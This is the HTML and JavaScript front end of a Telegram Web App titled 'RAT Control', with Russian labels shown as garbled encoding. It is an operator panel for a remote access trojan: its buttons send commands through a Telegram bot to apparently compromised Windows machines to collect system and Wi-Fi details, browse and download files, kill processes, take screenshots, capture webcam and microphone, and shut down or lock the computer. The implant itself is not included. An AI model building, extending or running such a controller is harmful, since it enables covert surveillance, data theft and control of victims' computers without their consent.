<!DOCTYPE html>
<html>
<head>
    <title>RAT Control</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            padding: 16px;
        }

        .header {
            background: linear-gradient(135deg, #0088cc, #006699);
            color: white;
            margin: -16px -16px 20px -16px;
            padding: 20px 16px;
            border-radius: 0 0 20px 20px;
        }

        .card {
            background: white;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
        }

        .card-title {
            font-size: 18px;
            font-weight: 600;
            color: #0088cc;
            margin-bottom: 12px;
        }

        .button-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 8px;
            margin-bottom: 16px;
        }

        .button {
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 10px;
            padding: 12px;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }

        .button:active {
            transform: scale(0.95);
            opacity: 0.8;
        }

        .button.secondary {
            background: #6c757d;
        }

        .output {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 16px;
            font-family: monospace;
            font-size: 13px;
            line-height: 1.6;
            white-space: pre-wrap;
            max-height: 400px;
            overflow-y: auto;
            border: 1px solid #dee2e6;
        }

        .file-item {
            display: flex;
            padding: 8px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
        }

        .file-item:hover {
            background: #f0f0f0;
        }

        .file-icon {
            width: 30px;
        }

        .file-name {
            flex: 1;
        }

        .file-size {
            color: #666;
        }

        .status {
            position: fixed;
            bottom: 20px;
            left: 16px;
            right: 16px;
            background: #333;
            color: white;
            padding: 12px;
            border-radius: 30px;
            text-align: center;
            display: none;
        }

        .status.show {
            display: block;
        }

        .path-bar {
            background: #e9ecef;
            padding: 10px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: monospace;
        }

        .input-group {
            display: flex;
            gap: 8px;
            margin: 10px 0;
        }

        .input {
            flex: 1;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>ü§ñ RAT CONTROL</h1>
        <p>–£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º</p>
    </div>

    <!-- –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–ò–°–¢–ï–ú–ï -->
    <div class="card">
        <div class="card-title">üìä –ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–ò–°–¢–ï–ú–ï</div>
        <div class="button-grid">
            <button class="button" onclick="sendRequest('system_info')">üîÑ –û–±–Ω–æ–≤–∏—Ç—å</button>
            <button class="button secondary" onclick="sendRequest('cpu_info')">‚öôÔ∏è CPU</button>
            <button class="button secondary" onclick="sendRequest('ram_info')">üíæ RAM</button>
            <button class="button secondary" onclick="sendRequest('disk_info')">üíø –î–∏—Å–∫</button>
        </div>
        <div id="systemOutput" class="output">–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏</div>
    </div>

    <!-- –°–ï–¢–¨ -->
    <div class="card">
        <div class="card-title">üåê –°–ï–¢–¨</div>
        <div class="button-grid">
            <button class="button" onclick="sendRequest('network_info')">üì° –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è</button>
            <button class="button secondary" onclick="sendRequest('wifi_info')">üì∂ Wi-Fi</button>
        </div>
        <div id="networkOutput" class="output"></div>
    </div>

    <!-- –§–ê–ô–õ–´ -->
    <div class="card">
        <div class="card-title">üìÅ –§–ê–ô–õ–´</div>
        <div class="path-bar" id="currentPath">C:\</div>
        <div class="button-grid">
            <button class="button" onclick="listFiles()">üìã –°–ø–∏—Å–æ–∫</button>
            <button class="button secondary" onclick="goBack()">‚¨ÜÔ∏è –ù–∞–∑–∞–¥</button>
        </div>
        <div class="input-group">
            <input type="text" id="folderPath" class="input" placeholder="–ü—É—Ç—å –∫ –ø–∞–ø–∫–µ">
            <button class="button secondary" onclick="changeDir()">–ü–µ—Ä–µ–π—Ç–∏</button>
        </div>
        <div id="fileList" class="output"></div>
    </div>

    <!-- –ü–†–û–¶–ï–°–°–´ -->
    <div class="card">
        <div class="card-title">üìã –ü–†–û–¶–ï–°–°–´</div>
        <div class="button-grid">
            <button class="button" onclick="sendRequest('processes')">üìä –í—Å–µ</button>
            <button class="button secondary" onclick="sendRequest('top_cpu')">‚ö° –ü–æ CPU</button>
            <button class="button secondary" onclick="sendRequest('top_ram')">üíæ –ü–æ RAM</button>
        </div>
        <div class="input-group">
            <input type="number" id="pid" class="input" placeholder="PID">
            <button class="button" onclick="killProcess()">üî™ –£–±–∏—Ç—å</button>
        </div>
        <div id="processesOutput" class="output"></div>
    </div>

    <!-- –ú–ï–î–ò–ê -->
    <div class="card">
        <div class="card-title">üé• –ú–ï–î–ò–ê</div>
        <div class="button-grid">
            <button class="button" onclick="sendMedia('screen')">üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç</button>
            <button class="button" onclick="sendMedia('webcam')">üì∑ –í–µ–±–∫–∞</button>
            <button class="button" onclick="sendMedia('mic')">üé§ –ú–∏–∫—Ä–æ—Ñ–æ–Ω</button>
        </div>
    </div>

    <!-- –£–ü–†–ê–í–õ–ï–ù–ò–ï -->
    <div class="card">
        <div class="card-title">‚ö° –£–ü–†–ê–í–õ–ï–ù–ò–ï</div>
        <div class="button-grid">
            <button class="button" onclick="sendPower('restart')">üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞</button>
            <button class="button" onclick="sendPower('shutdown')">‚èª –í—ã–∫–ª—é—á–µ–Ω–∏–µ</button>
            <button class="button secondary" onclick="sendPower('lock')">üîí –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞</button>
            <button class="button secondary" onclick="sendPower('sleep')">üò¥ –°–æ–Ω</button>
        </div>
    </div>

    <div id="status" class="status"></div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let currentDir = 'C:\\';
        let pendingRequests = {};

        // –§—É–Ω–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞
        async function sendRequest(action, params = {}) {
            const requestId = Date.now();
            const message = JSON.stringify({
                action: action,
                params: params,
                requestId: requestId
            });
            
            showStatus('‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞...');
            
            // –°–æ—Ö—Ä–∞–Ω—è–µ–º requestId –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –æ—Ç–≤–µ—Ç–∞
            pendingRequests[requestId] = action;
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram
            tg.sendData(message);
        }

        // –ü–æ–ª—É—á–µ–Ω–∏–µ –æ—Ç–≤–µ—Ç–æ–≤ –æ—Ç –±–æ—Ç–∞
        tg.onEvent('web_app_data', function(data) {
            try {
                const response = JSON.parse(data);
                console.log('üì© –û—Ç–≤–µ—Ç:', response);
                
                if (response.requestId && pendingRequests[response.requestId]) {
                    const action = pendingRequests[response.requestId];
                    
                    // –û—Ç–æ–±—Ä–∞–∂–∞–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Ç–∏–ø–∞ –∑–∞–ø—Ä–æ—Å–∞
                    if (action.includes('system') || action.includes('cpu') || action.includes('ram') || action.includes('disk')) {
                        document.getElementById('systemOutput').innerHTML = formatOutput(response.data);
                    } else if (action.includes('network') || action.includes('wifi')) {
                        document.getElementById('networkOutput').innerHTML = formatOutput(response.data);
                    } else if (action.includes('process')) {
                        document.getElementById('processesOutput').innerHTML = formatProcesses(response.data);
                    } else if (action === 'list_files' || action === 'change_dir' || action === 'go_back') {
                        if (response.data && response.data.files) {
                            currentDir = response.data.current_dir;
                            document.getElementById('currentPath').textContent = currentDir;
                            document.getElementById('fileList').innerHTML = formatFiles(response.data.files);
                        }
                    }
                    
                    delete pendingRequests[response.requestId];
                    showStatus('‚úÖ –î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã');
                }
            } catch (e) {
                console.error('–û—à–∏–±–∫–∞:', e);
            }
        });

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—ã–≤–æ–¥–∞
        function formatOutput(data) {
            if (!data) return '–ù–µ—Ç –¥–∞–Ω–Ω—ã—Ö';
            if (typeof data === 'string') return data;
            return JSON.stringify(data, null, 2);
        }

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–æ–≤
        function formatFiles(files) {
            let html = '';
            files.forEach(f => {
                const icon = f.is_dir ? 'üìÅ' : 'üìÑ';
                html += `<div class="file-item" onclick="downloadFile('${f.name}')">
                    <span class="file-icon">${icon}</span>
                    <span class="file-name">${f.name}</span>
                    <span class="file-size">${f.size}</span>
                </div>`;
            });
            return html;
        }

        // –§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
        function formatProcesses(processes) {
            let html = '';
            processes.forEach(p => {
                html += `<div class="file-item">
                    <span class="file-icon">üìä</span>
                    <span class="file-name">${p.name}</span>
                    <span class="file-size">CPU: ${p.cpu}% RAM: ${p.ram}%</span>
                </div>`;
            });
            return html;
        }

        // –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è —Ñ–∞–π–ª–æ–≤
        function listFiles() {
            sendRequest('list_files', { path: currentDir });
        }

        function goBack() {
            sendRequest('go_back', { path: currentDir });
        }

        function changeDir() {
            const path = document.getElementById('folderPath').value;
            if (path) {
                sendRequest('change_dir', { current: currentDir, path: path });
            }
        }

        function downloadFile(name) {
            sendRequest('get', { path: currentDir + '\\' + name });
        }

        function killProcess() {
            const pid = document.getElementById('pid').value;
            if (pid) {
                sendRequest('kill_process', { pid: parseInt(pid) });
            }
        }

        function sendMedia(action) {
            sendRequest(action);
        }

        function sendPower(action) {
            sendRequest(action);
        }

        function showStatus(text) {
            const status = document.getElementById('status');
            status.textContent = text;
            status.classList.add('show');
            setTimeout(() => status.classList.remove('show'), 2000);
        }
    </script>
</body>
</html>
